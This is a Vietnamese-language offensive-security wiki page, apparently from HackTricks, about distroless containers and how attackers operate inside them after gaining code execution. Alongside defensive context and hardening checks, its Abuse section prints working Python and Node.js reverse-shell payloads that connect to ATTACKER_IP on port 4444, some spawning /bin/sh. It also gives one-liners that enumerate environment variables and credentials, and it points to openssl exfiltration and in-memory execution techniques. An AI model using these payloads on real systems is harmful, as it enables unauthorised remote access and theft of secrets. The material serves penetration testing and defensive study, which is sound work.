# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Image container **distroless** cung cấp **các thành phần runtime tối thiểu cần thiết để chạy một ứng dụng cụ thể**, đồng thời chủ ý loại bỏ các công cụ phân phối thường có như trình quản lý gói, shell và nhiều tiện ích userland đa dụng. Trên thực tế, image distroless thường chỉ chứa binary hoặc runtime của ứng dụng, các thư viện dùng chung, bundle chứng chỉ và một cấu trúc filesystem rất nhỏ. <sup>[[1]](#references)</sup>

Distroless không phải là một primitive cô lập kernel mới. Distroless là **chiến lược thiết kế image**. Nó thay đổi những gì có sẵn **bên trong** filesystem của container, chứ không thay đổi cách kernel cô lập container. Sự khác biệt này rất quan trọng, vì distroless chủ yếu harden môi trường bằng cách giảm những gì kẻ tấn công có thể sử dụng sau khi giành được quyền thực thi mã. Nó không thay thế namespaces, seccomp, capabilities, AppArmor, SELinux hay bất kỳ cơ chế cô lập runtime nào khác.

## Vì Sao Có Distroless

Image distroless chủ yếu được dùng để giảm:

- kích thước image
- độ phức tạp vận hành của image
- số lượng package và binary có thể chứa lỗ hổng
- số lượng công cụ post-exploitation mặc định mà kẻ tấn công có thể sử dụng

Đó là lý do image distroless phổ biến trong các triển khai ứng dụng production. Container không có shell, trình quản lý gói và gần như không có công cụ đa dụng thường dễ quản lý vận hành hơn, đồng thời khó bị lạm dụng theo cách tương tác sau khi bị compromise.

Một số họ image kiểu distroless nổi tiếng gồm:

- Image distroless của Google <sup>[[1]](#references)</sup>
- Image hardened/minimal của Chainguard <sup>[[2]](#references)</sup>

## Distroless Không Có Nghĩa Là Gì

Container distroless **không**:

- tự động chạy rootless
- tự động không có đặc quyền
- tự động ở chế độ chỉ đọc
- tự động được bảo vệ bằng seccomp, AppArmor hoặc SELinux
- tự động an toàn trước container escape

Bạn vẫn có thể chạy image distroless với `--privileged`, chia sẻ namespace của host, dùng bind mount nguy hiểm hoặc mount socket runtime. Trong trường hợp đó, image có thể tối giản, nhưng container vẫn có thể cực kỳ không an toàn. Distroless thay đổi **bề mặt tấn công userland**, chứ không thay đổi **ranh giới tin cậy của kernel**.

## Đặc Điểm Vận Hành Thường Gặp

Khi compromise một container distroless, điều đầu tiên bạn thường nhận ra là những giả định phổ biến không còn đúng. Có thể không có `sh`, `bash`, `ls`, `id`, `cat`, và đôi khi thậm chí cũng không có môi trường dựa trên libc hoạt động như cách tradecraft quen thuộc của bạn vẫn kỳ vọng. Điều này ảnh hưởng đến cả tấn công lẫn phòng thủ, vì thiếu công cụ khiến việc debug, ứng phó sự cố và post-exploitation diễn ra khác đi.

Các kiểu thường gặp nhất là:

- có runtime của ứng dụng nhưng hầu như không có gì khác
- payload dựa trên shell thất bại vì không có shell
- các lệnh one-liner enumeration phổ biến thất bại vì thiếu binary hỗ trợ
- các biện pháp bảo vệ filesystem như rootfs chỉ đọc hoặc `noexec` trên các vị trí tmpfs có thể ghi cũng thường được áp dụng

Sự kết hợp này thường khiến mọi người nói đến việc "weaponize distroless".

## Distroless Và Post-Exploitation

Thách thức chính khi tấn công trong môi trường distroless không phải lúc nào cũng là RCE ban đầu. Thường thì vấn đề nằm ở những gì xảy ra tiếp theo. Nếu workload bị khai thác cho phép thực thi mã trong một runtime ngôn ngữ như Python, Node.js, Java hoặc Go, bạn có thể thực thi logic tùy ý, nhưng không thể dùng các quy trình làm việc tập trung vào shell vốn phổ biến trên các mục tiêu Linux khác.

Điều đó có nghĩa là post-exploitation thường chuyển sang một trong ba hướng:

1. **Dùng trực tiếp runtime ngôn ngữ hiện có** để enumeration môi trường, mở socket, đọc file hoặc triển khai thêm payload.
2. **Đưa công cụ của riêng bạn vào bộ nhớ** nếu filesystem ở chế độ chỉ đọc hoặc các vị trí có thể ghi được mount với `noexec`.
3. **Lạm dụng các binary có sẵn trong image** nếu ứng dụng hoặc các dependency của nó có chứa thứ gì đó hữu ích ngoài dự kiến.

## Lạm dụng

### Enumeration Runtime Sẵn Có

Trong nhiều container distroless không có shell, nhưng vẫn có runtime của ứng dụng. Nếu mục tiêu là một dịch vụ Python thì sẽ có Python. Nếu mục tiêu là Node.js thì sẽ có Node. Điều đó thường cung cấp đủ chức năng để enumeration file, đọc biến môi trường, mở reverse shell và triển khai thực thi trong bộ nhớ mà không cần gọi `/bin/sh`.

Ví dụ đơn giản với Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Một ví dụ đơn giản với Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Tác động:

- khôi phục biến môi trường, thường bao gồm thông tin xác thực hoặc service endpoint
- liệt kê filesystem mà không cần `/bin/ls`
- xác định các đường dẫn có quyền ghi và secret được mount

### Runtime tương tác khi không có `/bin/sh`

Nếu image không chứa `sh` hoặc `bash`, reverse shell kiểu cổ điển dựa trên shell sẽ thất bại. Trong trường hợp đó, hãy mở một phiên tương tác trong runtime của ngôn ngữ đã cài đặt thay vì khởi chạy một shell không tồn tại.

Ví dụ, payload Python này chuyển hướng một console Python tương tác qua socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Cách tiếp cận tương đương trong Node.js có thể thực thi JavaScript nhận được qua một socket. Đây là REPL JavaScript, không phải shell của hệ điều hành; các thao tác với hệ thống tệp, tiến trình và mạng phải được thực hiện thông qua API của Node:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Cả hai ví dụ đều cần kết nối ra ngoài và một trình thông dịch có sẵn, đồng thời chỉ cung cấp các chức năng mà trình thông dịch đó hỗ trợ.

Nếu image bất ngờ có `/bin/sh`, các shell payload kinh điển dùng trình thông dịch vẫn hữu ích. Chúng được trình bày riêng vì thực chất không phải là các payload không cần shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Mẫu vòng lặp lệnh Python cũ cũng hữu ích khi có `/bin/sh` nhưng dùng PTY tương tác không thuận tiện. Mẫu này được giữ lại ở đây và nêu rõ dependency thực sự: `subprocess.run(..., shell=True)` gọi system shell, vì vậy đây **không phải** là kỹ thuật không dùng shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Ví dụ đầy đủ: Vòng lặp lệnh Python không có shell

Nếu image có Python nhưng hoàn toàn không có shell, một Python REPL cục bộ vẫn có thể hỗ trợ kiểm tra hệ thống tệp, môi trường và mạng:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Vòng lặp này không gọi `/bin/sh`. Nó trực tiếp đánh giá các biểu thức và câu lệnh Python, vì vậy các thao tác phải sử dụng API của Python thay vì lệnh shell. Dù có giới hạn đó, nó vẫn có thể cung cấp phần lớn khả năng của một shell cơ bản: liệt kê hệ thống tệp và môi trường, truy cập dữ liệu, hoạt động mạng và tải thêm payload thông qua runtime đã cài đặt.

### Thực thi công cụ trong bộ nhớ

Các image Distroless thường được kết hợp với:

- `readOnlyRootFilesystem: true`
- tmpfs có thể ghi nhưng `noexec`, chẳng hạn như `/dev/shm`
- không có công cụ quản lý gói

Sự kết hợp đó khiến quy trình kinh điển “tải binary xuống đĩa rồi chạy” trở nên không đáng tin cậy. Trong những trường hợp này, các kỹ thuật thực thi trong bộ nhớ trở thành giải pháp chính.

Trang chuyên biệt về chủ đề này là:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Các kỹ thuật phù hợp nhất tại đó là:

- `memfd_create` + `execve` thông qua scripting runtime <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Với dịch vụ Python, Node.js hoặc PHP, điểm vào có thể là một lỗi trong ứng dụng, chẳng hạn như template injection, prototype pollution hoặc unsafe evaluation. Nếu lỗi đó cho phép thực thi mã bên trong tiến trình, kỹ thuật `/proc/self/mem` có thể chạy một loader mà không cần shell hay tệp thực thi trên đĩa. Việc này vẫn thực thi với danh tính của tiến trình container; cần có thêm điểm yếu riêng trong runtime hoặc ranh giới host để thực hiện container escape. Xem [các kỹ thuật read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) để biết các điều kiện tiên quyết.

### Các binary có sẵn trong image

Một số image Distroless vẫn chứa các binary cần thiết cho hoạt động, vốn trở nên hữu ích sau khi bị xâm nhập. Một ví dụ thường được ghi nhận là `openssl`, vì đôi khi ứng dụng cần dùng nó cho các tác vụ liên quan đến crypto hoặc TLS.

Mẫu tìm kiếm nhanh là:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Nếu có `openssl`, nó có thể được dùng để:

- tạo kết nối TLS outbound
- exfiltrate dữ liệu qua kênh egress được cho phép
- staging dữ liệu payload thông qua các blob đã mã hóa/được mã hóa

Cách abuse cụ thể phụ thuộc vào những gì thực sự được cài đặt, nhưng ý tưởng chung là distroless không có nghĩa là “hoàn toàn không có công cụ”; mà là “có ít công cụ hơn nhiều so với image của một bản phân phối thông thường”.

## Kiểm tra

Mục tiêu của các bước kiểm tra này là xác định xem image có thực sự distroless trên thực tế hay không, và những binary runtime hoặc helper nào vẫn có sẵn để phục vụ post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Điều gì đáng chú ý ở đây:

- Nếu không có shell nhưng có runtime như Python hoặc Node, post-exploitation nên chuyển sang thực thi thông qua runtime.
- Nếu root filesystem ở chế độ chỉ đọc và `/dev/shm` có thể ghi nhưng bị gắn `noexec`, các kỹ thuật thực thi trong bộ nhớ sẽ trở nên hữu ích hơn nhiều.
- Nếu có các binary hỗ trợ như `openssl`, `busybox` hoặc `java`, chúng có thể cung cấp đủ chức năng để mở rộng quyền truy cập.

## Cấu hình mặc định của runtime

| Kiểu image / nền tảng | Trạng thái mặc định | Hành vi thường gặp | Cách làm suy yếu thủ công phổ biến |
| --- | --- | --- | --- |
| Image theo phong cách Google distroless | Được thiết kế với userland tối giản | Không có shell, không có trình quản lý gói, chỉ có các dependency của ứng dụng/runtime | thêm lớp debug, shell sidecar, sao chép busybox hoặc công cụ vào image |
| Image tối giản Chainguard | Được thiết kế với userland tối giản | Giảm bề mặt gói, thường tập trung vào một runtime hoặc dịch vụ | dùng biến thể `:latest-dev` hoặc debug, sao chép công cụ trong quá trình build |
| Workload Kubernetes dùng image distroless | Phụ thuộc vào cấu hình Pod | Distroless chỉ ảnh hưởng đến userland; tư thế bảo mật của Pod vẫn phụ thuộc vào đặc tả Pod và cấu hình mặc định của runtime | thêm container debug tạm thời, mount host, cấu hình Pod có đặc quyền |
| Docker / Podman chạy image distroless | Phụ thuộc vào các cờ chạy | Filesystem tối giản, nhưng bảo mật runtime vẫn phụ thuộc vào các cờ và cấu hình daemon | `--privileged`, chia sẻ namespace của host, mount socket runtime, bind mount host có quyền ghi |

Điểm mấu chốt là distroless là một **thuộc tính của image**, không phải cơ chế bảo vệ của runtime. Giá trị của nó nằm ở việc giảm những gì có sẵn trong filesystem sau khi bị xâm nhập. Multi-stage build là cách phổ biến để giữ các công cụ build bên ngoài image cuối cùng. <sup>[[3]](#references)</sup>

## Các trang liên quan

Để tìm hiểu các cách vượt qua bảo vệ filesystem và thực thi trong bộ nhớ thường cần trong môi trường distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Để tìm hiểu hành vi lạm dụng runtime container, socket và mount vẫn áp dụng cho workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Hình ảnh container Distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Tài liệu về Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Multi-stage build](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
